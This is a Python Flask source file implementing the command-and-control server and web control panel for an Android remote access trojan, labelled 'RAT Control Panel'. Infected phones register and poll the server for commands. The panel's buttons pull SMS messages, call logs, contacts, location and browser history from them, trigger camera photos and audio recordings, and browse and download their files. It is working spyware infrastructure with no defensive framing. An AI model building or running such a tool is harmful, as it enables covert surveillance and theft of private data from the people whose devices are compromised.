from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json
import os
import threading
import time
import base64

app = Flask(__name__)

DATA_FILE = '/tmp/rat_data.json'

def load_data():
    try:
        with open(DATA_FILE) as f:
            return json.load(f)
    except:
        return {'events': [], 'devices': {}}

def save_data(events, devices):
    with open(DATA_FILE, 'w') as f:
        json.dump({'events': events, 'devices': devices}, f, indent=2)

saved = load_data()
log_entries = saved.get('events', [])
devices = saved.get('devices', {})
command_queue = []
command_results = {}
file_cache = {}

print(f"[*] Loaded {len(devices)} devices and {len(log_entries)} events")

def cleanup_stale_devices():
    while True:
        time.sleep(60)
        now = datetime.now()
        stale = []
        for d, info in devices.items():
            last_seen = info.get('last_seen', '')
            if last_seen:
                try:
                    last = datetime.fromisoformat(last_seen)
                    if (now - last).seconds > 300:
                        stale.append(d)
                except:
                    stale.append(d)
        for d in stale:
            devices[d]['online'] = False
        if stale:
            save_data(log_entries, devices)

threading.Thread(target=cleanup_stale_devices, daemon=True).start()

@app.route('/api/register', methods=['POST'])
def register_device():
    data = request.get_json()
    device_id = data.get('device_id', 'unknown')
    
    devices[device_id] = {
        'device_id': device_id,
        'model': data.get('model', 'Unknown'),
        'android_version': data.get('android_version', 'Unknown'),
        'first_seen': devices.get(device_id, {}).get('first_seen', datetime.now().isoformat()),
        'last_seen': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'online': True,
    }
    
    save_data(log_entries, devices)
    print(f"[+] Device registered: {device_id} - Total: {len(devices)}")
    return jsonify({'status': 'ok', 'device_id': device_id})

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    device_id = data.get('device_id', 'unknown')
    
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online'] = True
        devices[device_id]['ip'] = request.remote_addr
    else:
        devices[device_id] = {
            'device_id': device_id,
            'model': 'Unknown',
            'android_version': 'Unknown',
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'ip': request.remote_addr,
            'online': True,
        }
    
    save_data(log_entries, devices)
    return jsonify({'status': 'ok'})

@app.route('/api/cmd', methods=['GET'])
def get_commands():
    device_id = request.args.get('device_id', 'unknown')
    
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online'] = True
    else:
        devices[device_id] = {
            'device_id': device_id,
            'model': 'Unknown',
            'android_version': 'Unknown',
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'ip': request.remote_addr,
            'online': True,
        }
    
    cmds = []
    remaining = []
    for cmd in command_queue:
        target = cmd.get('target_device', 'all')
        if target == 'all' or target == device_id:
            cmd['status'] = 'sent'
            cmd['sent_at'] = datetime.now().isoformat()
            cmds.append(cmd)
        else:
            remaining.append(cmd)
    
    command_queue.clear()
    command_queue.extend(remaining)
    
    return jsonify({'commands': cmds, 'queue_size': len(command_queue)})

@app.route('/api/result', methods=['POST'])
def post_result():
    data = request.get_json()
    cmd_id = data.get('cmd_id', 'unknown')
    data['server_received_at'] = datetime.now().isoformat()
    
    result_data = data.get('result', {})
    if isinstance(result_data, dict):
        if 'base64_data' in result_data and result_data['base64_data']:
            file_cache[cmd_id] = {
                'filename': result_data.get('file_name', 'unknown'),
                'base64_data': result_data['base64_data'],
                'mime_type': result_data.get('mime_type', 'application/octet-stream'),
                'file_size': result_data.get('file_size', 0),
            }
            result_data['_has_file'] = True
            result_data.pop('base64_data', None)
    
    command_results[cmd_id] = data
    
    log_entries.append({
        'type': 'command_result',
        'timestamp': datetime.now().isoformat(),
        'data': data,
    })
    
    if len(log_entries) > 2000:
        log_entries.pop(0)
    
    save_data(log_entries, devices)
    return jsonify({'status': 'ok'})

@app.route('/api/log', methods=['POST'])
def post_log():
    try:
        data = request.get_json()
        data['server_received_at'] = datetime.now().isoformat()
        log_entries.append(data)
        if len(log_entries) > 2000:
            log_entries.pop(0)
        save_data(log_entries, devices)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/log', methods=['GET'])
def get_logs():
    return jsonify({'total_events': len(log_entries), 'events': log_entries[-50:]})

@app.route('/api/file/<cmd_id>', methods=['GET'])
def get_file(cmd_id):
    file_info = file_cache.get(cmd_id)
    if not file_info:
        return jsonify({'error': 'File not found'}), 404
    
    mode = request.args.get('mode', 'base64')
    if mode == 'raw':
        try:
            raw_data = base64.b64decode(file_info['base64_data'])
            from flask import Response
            return Response(raw_data, mimetype=file_info.get('mime_type', 'application/octet-stream'),
                          headers={'Content-Disposition': f'attachment; filename="{file_info["filename"]}"'})
        except:
            return jsonify({'error': 'Invalid base64'}), 400
    
    return jsonify({
        'cmd_id': cmd_id,
        'filename': file_info['filename'],
        'mime_type': file_info.get('mime_type', 'application/octet-stream'),
        'file_size': file_info.get('file_size', 0),
        'base64_data': file_info['base64_data'],
    })

@app.route('/api/devices', methods=['GET'])
def get_devices():
    device_list = []
    for d in devices.values():
        device_list.append({
            'device_id': d.get('device_id', 'unknown'),
            'model': d.get('model', 'Unknown'),
            'android_version': d.get('android_version', 'Unknown'),
            'online': d.get('online', False),
            'last_seen': d.get('last_seen', ''),
            'ip': d.get('ip', ''),
        })
    online_count = sum(1 for d in device_list if d['online'])
    return jsonify({
        'devices': device_list,
        'total': len(device_list),
        'online': online_count
    })

@app.route('/api/send_cmd', methods=['POST'])
def send_command():
    data = request.get_json()
    cmd_id = f"cmd_{int(time.time() * 1000)}"
    command = {
        'cmd_id': cmd_id,
        'command': data.get('command', 'ping'),
        'params': data.get('params', {}),
        'target_device': data.get('target_device', 'all'),
        'created_at': datetime.now().isoformat(),
        'status': 'pending',
    }
    command_queue.append(command)
    return jsonify({'status': 'ok', 'cmd_id': cmd_id})

@app.route('/api/result/<cmd_id>', methods=['GET'])
def get_result(cmd_id):
    result = command_results.get(cmd_id)
    if result:
        result_data = result.get('result', {})
        has_file = isinstance(result_data, dict) and result_data.get('_has_file', False)
        return jsonify({'found': True, 'result': result, 'has_file': has_file})
    return jsonify({'found': False})

@app.route('/api/stats', methods=['GET'])
def get_stats():
    return jsonify({
        'total_events': len(log_entries),
        'devices_online': sum(1 for d in devices.values() if d.get('online')),
        'total_devices': len(devices),
        'pending_commands': len(command_queue),
    })

@app.route('/')
def control_panel():
    return render_template_string(HTML)

HTML = r'''<!DOCTYPE html>
<html>
<head>
    <title>RAT Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #0f0; min-height: 100vh; }
        .container { max-width: 1400px; margin: 0 auto; padding: 15px; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: #111; border-radius: 8px; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .header h1 { font-size: 1.3rem; color: #0f0; }
        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 15px; }
        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
        .panel { background: #111; border: 1px solid #222; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
        .panel h2 { font-size: 0.9rem; color: #0f0; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
        .device-card { background: #0a0a0a; border: 1px solid #222; border-radius: 6px; padding: 10px; margin-bottom: 8px; font-size: 0.75rem; cursor: pointer; }
        .device-card.online { border-color: #0f0; }
        .device-card.offline { border-color: #f00; opacity: 0.5; }
        .device-card.selected { border-color: #0ff; background: #0a1a1a; }
        .cmd-btn { display: block; width: 100%; padding: 10px; margin: 5px 0; background: #1a1a1a; color: #0f0; border: 1px solid #333; border-radius: 4px; cursor: pointer; font-family: monospace; font-size: 0.8rem; text-align: left; transition: all 0.2s; }
        .cmd-btn:hover { background: #0f0; color: #0a0a0a; }
        .cmd-btn.danger { color: #f44; border-color: #f44; }
        .cmd-btn.danger:hover { background: #f44; color: #0a0a0a; }
        .cmd-btn.file-btn { color: #ff8; border-color: #ff8; }
        .output-area { background: #050505; border: 1px solid #222; border-radius: 6px; padding: 12px; min-height: 200px; max-height: 400px; overflow-y: auto; font-size: 0.75rem; white-space: pre-wrap; word-break: break-all; }
        .file-list { list-style: none; padding: 0; }
        .file-list li { padding: 6px 10px; margin: 2px 0; cursor: pointer; border-radius: 3px; font-size: 0.75rem; }
        .file-list li:hover { background: #1a3a1a; }
        .file-list li.folder { color: #ff0; }
        .file-list li.file { color: #0ff; }
        .copy-btn { background: #333; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; border-radius: 3px; cursor: pointer; font-family: monospace; font-size: 0.7rem; margin: 4px; }
        .copy-btn:hover { background: #0f0; color: #000; }
        .image-preview { max-width: 100%; max-height: 300px; margin: 10px 0; border-radius: 4px; border: 1px solid #333; }
        .audio-player { width: 100%; margin: 10px 0; }
        .status-bar { display: flex; justify-content: space-between; align-items: center; padding: 8px 15px; background: #111; border-radius: 6px; font-size: 0.7rem; flex-wrap: wrap; gap: 10px; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .status-dot.online { background: #0f0; }
        .status-dot.offline { background: #f00; }
        .toast { position: fixed; top: 20px; right: 20px; padding: 12px 20px; border-radius: 6px; font-size: 0.8rem; z-index: 1000; }
        .toast.success { background: #0f0; color: #0a0a0a; }
        .toast.error { background: #f44; color: #fff; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>RAT Control Panel</h1>
            <div id="stats"></div>
        </div>
        <div class="status-bar">
            <span>Devices: <strong id="deviceCount">-</strong></span>
            <span>Online: <strong id="onlineCount">-</strong></span>
            <span>Events: <strong id="eventCount">-</strong></span>
            <span>Pending: <strong id="pendingCount">-</strong></span>
            <button onclick="refreshAll()" style="background:#0f0;color:#000;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">Refresh</button>
        </div>
        <div class="grid">
            <div>
                <div class="panel">
                    <h2>Devices</h2>
                    <div id="deviceList"><p style="color:#666;">Loading...</p></div>
                </div>
                <div class="panel">
                    <h2>Commands</h2>
                    <button class="cmd-btn" onclick="sendCmd('get_sms_inbox')">Get SMS Inbox</button>
                    <button class="cmd-btn" onclick="sendCmd('get_call_logs')">Get Call Logs</button>
                    <button class="cmd-btn" onclick="sendCmd('get_contacts')">Get Contacts</button>
                    <button class="cmd-btn" onclick="sendCmd('get_installed_apps')">Installed Apps</button>
                    <button class="cmd-btn" onclick="sendCmd('capture_photo', {camera: 'back'})">Capture Back Camera</button>
                    <button class="cmd-btn" onclick="sendCmd('capture_photo', {camera: 'front'})">Capture Front Camera</button>
                    <button class="cmd-btn" onclick="sendCmd('record_audio', {duration: 10})">Record Audio (10s)</button>
                    <button class="cmd-btn" onclick="sendCmd('get_location')">Get Location</button>
                    <button class="cmd-btn file-btn" onclick="sendCmd('scan_files', {path: '/storage/emulated/0'})">Browse Files (Root)</button>
                    <button class="cmd-btn" onclick="sendCmd('get_chrome_history')">Chrome History</button>
                    <button class="cmd-btn danger" onclick="sendCmd('ping')">Ping</button>
                </div>
            </div>
            <div>
                <div class="panel">
                    <h2>Output</h2>
                    <div class="output-area" id="output">Select a device and send a command.</div>
                </div>
                <div class="panel">
                    <h2>Recent Events</h2>
                    <div class="output-area" id="events" style="max-height:200px;">Loading...</div>
                </div>
            </div>
        </div>
    </div>
    <div id="toastContainer"></div>
    <script>
        var selectedDevice = 'all';
        var devices = [];

        function toast(msg, type) {
            var t = document.createElement('div');
            t.className = 'toast ' + type;
            t.textContent = msg;
            document.getElementById('toastContainer').appendChild(t);
            setTimeout(function() { t.remove(); }, 3000);
        }

        function refreshAll() {
            loadDevices();
            loadStats();
            loadEvents();
        }

        function loadDevices() {
            fetch('/api/devices')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    devices = data.devices || [];
                    document.getElementById('deviceCount').textContent = data.total || devices.length;
                    document.getElementById('onlineCount').textContent = data.online || 0;
                    renderDevices();
                })
                .catch(function(e) {
                    console.error('Devices error:', e);
                    document.getElementById('deviceList').innerHTML = '<p style="color:#f44;">Error loading devices. Check console.</p>';
                });
        }

        function renderDevices() {
            var container = document.getElementById('deviceList');
            if (devices.length === 0) {
                container.innerHTML = '<p style="color:#666;">No devices connected yet.<br><small>Install the app on your phone and grant permissions.</small></p>';
                return;
            }
            var html = '';
            for (var i = 0; i < devices.length; i++) {
                var d = devices[i];
                var onlineClass = d.online ? 'online' : 'offline';
                var selectedClass = selectedDevice === d.device_id ? ' selected' : '';
                html += '<div class="device-card ' + onlineClass + selectedClass + '" onclick="selectDevice(\'' + d.device_id + '\')">';
                html += '<strong>' + d.device_id + '</strong><br>';
                html += (d.model || 'Unknown') + ' | ' + (d.android_version || '?') + '<br>';
                html += '<span class="status-dot ' + onlineClass + '"></span>';
                html += (d.online ? 'Online' : 'Offline');
                html += '</div>';
            }
            container.innerHTML = html;
        }

        function selectDevice(id) {
            selectedDevice = id;
            renderDevices();
            document.getElementById('output').textContent = 'Selected: ' + id;
        }

        function sendCmd(command, params) {
            params = params || {};
            if (selectedDevice === 'all' && !confirm('Send to ALL devices?')) return;
            
            document.getElementById('output').textContent = 'Sending: ' + command + '...';
            
            fetch('/api/send_cmd', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command, params: params, target_device: selectedDevice})
            })
            .then(function(res) { return res.json(); })
            .then(function(data) {
                toast('Command sent!', 'success');
                document.getElementById('output').textContent = 'Waiting for device... (Cmd: ' + data.cmd_id + ')';
                pollResult(data.cmd_id, command);
            })
            .catch(function(e) {
                toast('Failed: ' + e.message, 'error');
            });
        }

        function pollResult(cmdId, command) {
            var output = document.getElementById('output');
            fetch('/api/result/' + cmdId)
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.found) {
                        var result = data.result.result || {};
                        if (command === 'scan_files' && result.files) {
                            renderFileBrowser(result, cmdId);
                        } else if (command === 'capture_photo' && data.has_file) {
                            renderPhotoResult(result, cmdId);
                        } else if (command === 'record_audio' && data.has_file) {
                            renderAudioResult(result, cmdId);
                        } else if (command === 'get_file_content' && data.has_file) {
                            renderFileContent(result, cmdId);
                        } else {
                            output.textContent = 'Result:\n' + JSON.stringify(result, null, 2);
                        }
                    } else {
                        output.textContent = 'Still waiting... retrying in 5s';
                        setTimeout(function() { pollResult(cmdId, command); }, 5000);
                    }
                })
                .catch(function() {
                    setTimeout(function() { pollResult(cmdId, command); }, 5000);
                });
        }

        function renderFileBrowser(result, cmdId) {
            var output = document.getElementById('output');
            var path = result.path || '/';
            var files = result.files || [];
            var html = '<div><strong>Folder: ' + path + '</strong> (' + files.length + ' items)</div>';
            html += '<button class="copy-btn" onclick="sendCmd(\'scan_files\', {path: \'' + getParentPath(path) + '\'})">Up</button><hr style="border-color:#333;">';
            html += '<ul class="file-list">';
            for (var i = 0; i < files.length; i++) {
                var f = files[i];
                var icon = f.isDirectory ? 'FOLDER' : 'FILE';
                var cls = f.isDirectory ? 'folder' : 'file';
                var escapedPath = f.path.replace(/'/g, "\\'");
                var escapedName = (f.name || 'file').replace(/'/g, "\\'");
                var onclick = f.isDirectory 
                    ? "sendCmd('scan_files', {path: '" + escapedPath + "'})"
                    : "sendCmd('get_file_content', {path: '" + escapedPath + "', filename: '" + escapedName + "'})";
                html += '<li class="' + cls + '" onclick="' + onclick + '">' + icon + ' ' + f.name + ' <span style="color:#666;">' + (f.isDirectory ? '' : formatSize(f.size)) + '</span></li>';
            }
            if (files.length === 0) html += '<li style="color:#666;">Empty directory</li>';
            html += '</ul>';
            output.innerHTML = html;
        }

        function renderPhotoResult(result, cmdId) {
            var output = document.getElementById('output');
            output.innerHTML = '<strong>Photo Captured</strong><br><small>' + (result.file_path || '') + '</small><br>' +
                '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'image\')">View Image</button> ' +
                '<button class="copy-btn" onclick="downloadFile(\'' + cmdId + '\')">Download</button> ' +
                '<button class="copy-btn" onclick="copyBase64(\'' + cmdId + '\')">Copy Base64</button>' +
                '<div id="preview_' + cmdId + '"></div>';
        }

        function renderAudioResult(result, cmdId) {
            var output = document.getElementById('output');
            output.innerHTML = '<strong>Audio Recorded</strong><br><small>' + (result.file_path || '') + '</small><br>' +
                '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'audio\')">Play Audio</button> ' +
                '<button class="copy-btn" onclick="downloadFile(\'' + cmdId + '\')">Download</button> ' +
                '<button class="copy-btn" onclick="copyBase64(\'' + cmdId + '\')">Copy Base64</button>' +
                '<div id="preview_' + cmdId + '"></div>';
        }

        function renderFileContent(result, cmdId) {
            var output = document.getElementById('output');
            var mimeType = result.mime_type || '';
            var isImage = mimeType.indexOf('image/') === 0;
            var isAudio = mimeType.indexOf('audio/') === 0;
            output.innerHTML = '<strong>File: ' + (result.file_name || '') + '</strong><br><small>' + formatSize(result.file_size || 0) + '</small><br>' +
                (isImage ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'image\')">View</button> ' : '') +
                (isAudio ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'audio\')">Play</button> ' : '') +
                '<button class="copy-btn" onclick="downloadFile(\'' + cmdId + '\')">Download</button> ' +
                '<button class="copy-btn" onclick="copyBase64(\'' + cmdId + '\')">Copy Base64</button>' +
                '<div id="preview_' + cmdId + '"></div>';
        }

        function viewFile(cmdId, type) {
            var previewDiv = document.getElementById('preview_' + cmdId);
            fetch('/api/file/' + cmdId + '?mode=base64')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (type === 'image') {
                        previewDiv.innerHTML = '<img class="image-preview" src="data:' + data.mime_type + ';base64,' + data.base64_data + '" alt="Preview">';
                    } else if (type === 'audio') {
                        previewDiv.innerHTML = '<audio class="audio-player" controls src="data:' + data.mime_type + ';base64,' + data.base64_data + '"></audio>';
                    }
                })
                .catch(function() { toast('Failed to load file', 'error'); });
        }

        function downloadFile(cmdId) {
            window.open('/api/file/' + cmdId + '?mode=raw', '_blank');
        }

        function copyBase64(cmdId) {
            fetch('/api/file/' + cmdId + '?mode=base64')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    navigator.clipboard.writeText(data.base64_data).then(function() {
                        toast('Base64 copied!', 'success');
                    });
                })
                .catch(function() { toast('Failed to copy', 'error'); });
        }

        function getParentPath(path) {
            var parts = path.split('/');
            parts.pop();
            return parts.join('/') || '/';
        }

        function formatSize(bytes) {
            if (!bytes || bytes === 0) return '0 B';
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
            return (bytes / 1048576).toFixed(1) + ' MB';
        }

        function loadStats() {
            fetch('/api/stats')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    document.getElementById('eventCount').textContent = data.total_events || 0;
                    document.getElementById('pendingCount').textContent = data.pending_commands || 0;
                })
                .catch(function() {});
        }

        function loadEvents() {
            fetch('/api/log')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    var events = (data.events || []).slice(-20).reverse();
                    var html = '';
                    for (var i = 0; i < events.length; i++) {
                        html += '<div style="margin-bottom:6px;border-left:3px solid #888;padding-left:8px;">';
                        html += '<span style="color:#888;">' + (events[i].timestamp || '').substring(0, 19) + '</span> ';
                        html += '<span style="color:#0ff;">[' + (events[i].type || 'unknown') + ']</span>';
                        html += '</div>';
                    }
                    document.getElementById('events').innerHTML = html || '<p style="color:#666;">No events</p>';
                })
                .catch(function() {});
        }

        // Initial load
        refreshAll();
        // Auto-refresh every 10 seconds
        setInterval(refreshAll, 10000);
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"[*] Starting server on port {port}")
    app.run(host='0.0.0.0', port=port)